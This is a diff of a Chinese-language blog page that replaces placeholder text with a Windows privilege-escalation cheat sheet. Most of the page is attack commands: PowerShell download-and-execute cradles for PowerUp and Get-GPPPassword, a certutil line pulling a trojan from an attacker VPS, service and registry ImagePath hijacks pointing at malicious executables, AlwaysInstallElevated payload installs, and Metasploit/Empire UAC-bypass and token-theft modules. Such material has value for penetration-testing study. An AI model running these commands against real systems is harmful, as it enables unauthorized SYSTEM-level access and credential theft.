@@ -16,15 +16,15 @@
   <meta name="author" content="Quinn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一级标题1print(&quot;Hello&quot;)   这是一条引用  二级标题 1 2 3  三级标题四级标题">
+    <meta name="description" content="LinuxWindows系统内核溢出漏洞提权 利用系统本身存在的一些系统内核溢出漏洞没有打补丁，或者对比systeminfo信息中的补丁信息来查找确实的补丁号，通过补丁号对照对应的系统版本查找对应可以提升权限的exp  补丁查找方法123456789101112131415161718#手工查找	systeminfo	Wmic qfe get Caption,Description,HotFixI">
 <meta property="og:type" content="article">
 <meta property="og:title" content="提权">
 <meta property="og:url" content="http://15555553535.github.io/2023/04/23/%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="3e7en">
-<meta property="og:description" content="一级标题1print(&quot;Hello&quot;)   这是一条引用  二级标题 1 2 3  三级标题四级标题">
+<meta property="og:description" content="LinuxWindows系统内核溢出漏洞提权 利用系统本身存在的一些系统内核溢出漏洞没有打补丁，或者对比systeminfo信息中的补丁信息来查找确实的补丁号，通过补丁号对照对应的系统版本查找对应可以提升权限的exp  补丁查找方法123456789101112131415161718#手工查找	systeminfo	Wmic qfe get Caption,Description,HotFixI">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-04-23T02:55:11.000Z">
-<meta property="article:modified_time" content="2023-04-23T03:12:32.302Z">
+<meta property="article:modified_time" content="2023-04-23T06:53:19.790Z">
 <meta property="article:author" content="Quinn">
 <meta property="article:tag" content="权限提升">
 <meta name="twitter:card" content="summary_large_image">
@@ -229,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          50 字
+          6.3k 字
         
       </span>
     
@@ -240,7 +240,7 @@
         
         
         
-          1 分钟
+          53 分钟
         
       </span>
     
@@ -283,7 +283,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年4月23日 上午
+                    本文最后更新于：2023年4月23日 下午
                   
                 
               </p>
@@ -291,17 +291,68 @@
             
               <div class="markdown-body">
                 
-                <h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello&quot;</span>)<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这是一条引用</p>
+                <h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h3><blockquote>
+<p>利用系统本身存在的一些系统内核溢出漏洞没有打补丁，或者对比systeminfo信息中的补丁信息来查找确实的补丁号，通过补丁号对照对应的系统版本查找对应可以提升权限的exp</p>
 </blockquote>
-<h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><ul>
-<li>1</li>
-<li>2</li>
-<li>3</li>
+<h4 id="补丁查找方法"><a href="#补丁查找方法" class="headerlink" title="补丁查找方法"></a>补丁查找方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">手工查找</span><br>	systeminfo<br>	Wmic qfe get Caption,Description,HotFixID,InstalledOn<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">MSF后渗透扫描</span><br>	post/windows/gather/enum_patches<br>	post/multi/recon/local_exploit_suggester<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">windows exploit suggester</span><br>	https://github.com/AonCyberLabs/Windows-Exploit-Suggester<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">powershell中的sherlock脚本</span><br>	Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块<br>	Find-AllVulns<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br>	usemodule privesc/powerup/allchecks<br>	execute	<br></code></pre></td></tr></table></figure>
+<h4 id="版本对应的exp"><a href="#版本对应的exp" class="headerlink" title="版本对应的exp"></a>版本对应的exp</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br><a target="_blank" rel="noopener" href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
+</blockquote>
+<h3 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a>系统配置错误提权</h3><h4 id="权限配置错误"><a href="#权限配置错误" class="headerlink" title="权限配置错误"></a>权限配置错误</h4><blockquote>
+<p>Windows系统服务文件在操作系统启动时加载和运行，并在后台调用可执行文件<br>系统服务权限配置错误利用有如下两种方式：服务未启动：攻击者可以使用任意服务替换原来的服务，然后重启服务;服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用dll劫持技术并尝试重启服务来提权(需要administrtor权限)</p>
+</blockquote>
+<h5 id="查找错误配置"><a href="#查找错误配置" class="headerlink" title="查找错误配置"></a>查找错误配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">powerup提供了一些本地提权的方法，可以通过很多实用的脚本来寻找目标机器的windows服务漏洞</span><br>https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp<br>可直接通过powershell远程加载<br>	powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">msf 对应的模块为exploit/windows/local/service_permissions  但前提是获得一个会话</span><br>	run exploit/windows/local/service_permissions #自动化提权，回来的的权限就是system<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">当工具无法使用时，也可以手工查找，使用Windows内建工具icacls查看服务启动路径中写权限</span><br>	例如：icacls “C:\Program Files”<br>	icacls “C:\Program Files\Common Files”<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看指定目录的权限配置情况</span><br>	accesschk.exe -dqv &quot;D:\test&quot; -accepteula<br>参数说明：“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">检查服务 如果是.SERVICE_ALL_ACCESS的意思是我们对“Vulnerable Service”的属性拥有完全控制权</span><br>	accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula<br>	sc qc 服务名   #查看可以完全控制的服务的属性<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">schtask 查询</span><br>	schtasks /query /fo LIST 2&gt;nul<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">powershell</span><br>	Get-ScheduledTask<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">把服务启动的行为（exe或者脚本，com组件..）替换成我们的MSF反弹木马，当服务重启时，就会给我们返回一个system权限的meterpreter</span><br>	set AutoRunScript migrate -f#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程<br>为什么要自动迁移？<br>这是因为当一个服务在Windows系统中启动后，它必须和服务控制管理器通信，如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程，我们所有需要做的就是在终止载荷进程之前，将它迁移到其它进程。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">	#</span><span class="language-bash">run exploit/windows/local/service_permissions</span><br>	run exploit/windows/local/service_permissions<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">找到我们具有完全控制权限的服务，修改服务配置执行命令</span><br>	sc config 服务名 binpath = &quot;木马程序.exe&quot;   #INARY_PATH_NAME参数指向了该服务的可执行程序<br>	sc stop 服务名<br>	sc start 服务名<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">进行筛选 删除包含/Microsoft/Windows/路径的所有任务</span><br>	Get-ScheduledTask | Select * | ? &#123;($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)&#125; | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @&#123;Name=&quot;User&quot;;Expression=&#123;$_.Principal.userID&#125;&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">分析计划任务  查找行为，比如exe，脚本什么的</span><br><span class="hljs-meta prompt_">	$</span><span class="language-bash">task= Get-ScheduledTask -TaskName 计划任务名</span> <br>	ForEach ($triger in $task.Triggers) &#123; echo $triger.Repetition.Interval&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查找计划任务行为所在目录，低权限用户是否具有可写权限  accesschk.exe  当然也可以用icacls命令</span><br>	accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\1111.exe<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">直接替换</span><br>	certutil -urlcache -split -f &quot;http://你的vps/1111.exe&quot; C:\ScheduledTasks\Task1\1111.exe<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">等待计划任务执行</span><br><br>这里可以用木马程序可以用exe，任意脚本，dll文件等等，具体情况具体分析<br></code></pre></td></tr></table></figure>
+
+<h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><blockquote>
+<p>服务的可执行文件的路径没有双引号且包含空格,Windows会尝试寻找并执行名字与空格前的名字匹配的程序</p>
+</blockquote>
+<h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">wmi查找含有漏洞的服务命令</span><br>	wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PowerUp脚本</span><br>	https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp<br>	powershell.exe -exec bypass -Command &quot;&amp;&#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#查看指定目录的权限配置情况</span></span><br>	accesschk.exe -dqv &quot;D:\test&quot; -accepteula<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">msf攻击模块</span><br>	exploit/windows/local/trusted_service_path<br>	set AutoRunScript migrate -f<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">手动攻击</span><br>我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下<br>然后重启服务<br>	sc stop service_name<br>	sc start service_name<br></code></pre></td></tr></table></figure>
+
+<h4 id="不安全的注册表权限配置"><a href="#不安全的注册表权限配置" class="headerlink" title="不安全的注册表权限配置"></a>不安全的注册表权限配置</h4><blockquote>
+<p>如果低权限用户对”HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名\ImagePath”这个键值有写权限即可以控制这个服务</p>
+</blockquote>
+<h5 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">微软的工具</span><br>	https://www.microsoft.com/en-us/download/search.aspx?q=subinacl<br>	subinacl.exe /key reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名&quot; /display<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">如果我们对注册表有写入权限，就可以修改注册表，使得服务启动时运行我们的恶意程序</span><br>	reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service360rp&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:programdataadduser.exe&quot; /f<br></code></pre></td></tr></table></figure>
+
+<h4 id="启用注册表键AlwaysInstallElevated"><a href="#启用注册表键AlwaysInstallElevated" class="headerlink" title="启用注册表键AlwaysInstallElevated"></a>启用注册表键AlwaysInstallElevated</h4><blockquote>
+<p>AlwaysInstallElevated策略允许用户以System权限运行安装文件</p>
+</blockquote>
+<h5 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">PowerUp</span><br>	powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">当然也可以查看注册表键值是否被定义</span><br>	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">利用方法,启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行</span><br>	msiexec /quiet /qn /i muma.msi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">msf   需要一个会话</span><br>	run exploit/windows/local/always_install_elevated<br></code></pre></td></tr></table></figure>
+
+<h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><h4 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h4><blockquote>
+<p>AD里面一个存储域公共文件服务器副本的共享文件夹，所有认证用户都可以读取;SYSVOL在所有域控里进行自动同步和共享</p>
+</blockquote>
+<p><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\ #所有组策略均存储在如下位置</code></p>
+<h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><blockquote>
+<p>存储和使用凭据</p>
+</blockquote>
+<h5 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">Powershell获取cpassword</span><br>	Get-GPPPassword.ps1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。</span><br>	powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword<br>	kali gpp-decrypt命令破解密码<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Msf</span><br>	run post/windows/gather/credentials/gpp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Empire</span><br>	usemodule privesc/gpp<br></code></pre></td></tr></table></figure>
+
+<h3 id="bypassUAC提权"><a href="#bypassUAC提权" class="headerlink" title="bypassUAC提权"></a>bypassUAC提权</h3><blockquote>
+<p>UAC:用户账户控制，Windows的一个安全功能，支持防止对操作系统进行未授权的修改,UAC确保仅在管理员授权的情况下进行某些更改</p>
+</blockquote>
+<h4 id="没有管理员权限无法完成的操作"><a href="#没有管理员权限无法完成的操作" class="headerlink" title="没有管理员权限无法完成的操作"></a>没有管理员权限无法完成的操作</h4><ul>
+<li>注册表修改</li>
+<li>加载设备驱动程序</li>
+<li>DLL注入</li>
+<li>修改系统时间</li>
+<li>修改用户账户控制设置</li>
+<li>修改受保护的目录</li>
+<li>计划任务</li>
 </ul>
-<h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>
+<p>####利用方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">MSF</span><br>	exploit/wondows/local/ask  #弹出UAC确认窗口，点击后获得system权限<br>	exploit/windows/local/bypassuac	#通过进程注入使用可信任发布者绕过Windows UAC,生成关闭UAC标志的第二个shell<br>	exploit/windows/local/bypass_injection	#通过进程注入使用可信任发布者绕过Windows UAC<br>	exploit/windows/local/bypass_fodhelper	#通过当前用户配置单元下劫持注册表中特殊的键并插入将在启动Windows事件查看器/fodhelper.exe 应用程序时调用自定义命令来绕过UAC<br>	exploit/windows/local/bypass_eventvwr	#与上一个一致，调用注册表项在调用payload清除该项，不需要payload的体系架构和操作系统匹配<br>	exploit/windows/local/bypassuac_comhijack	#通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">POWERSHELL</span><br>	Invoke-PsUACme<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Empire</span><br>	usemodule privesc/bypassuac<br>	usemodule privesc/bypassuac_wscript<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">cs</span><br>	uac-dll<br>	uac-token-duplication<br></code></pre></td></tr></table></figure>
+
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">MSF</span><br>	use incognito	#进入incognito模块<br>	list_tokens -u	#列出令牌<br>	Delegation Token	#授权令牌<br>	Impresonation Token	#模拟令牌<br>	<br>	impresonate_Token &quot;令牌名&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3>
                 
               </div>
             
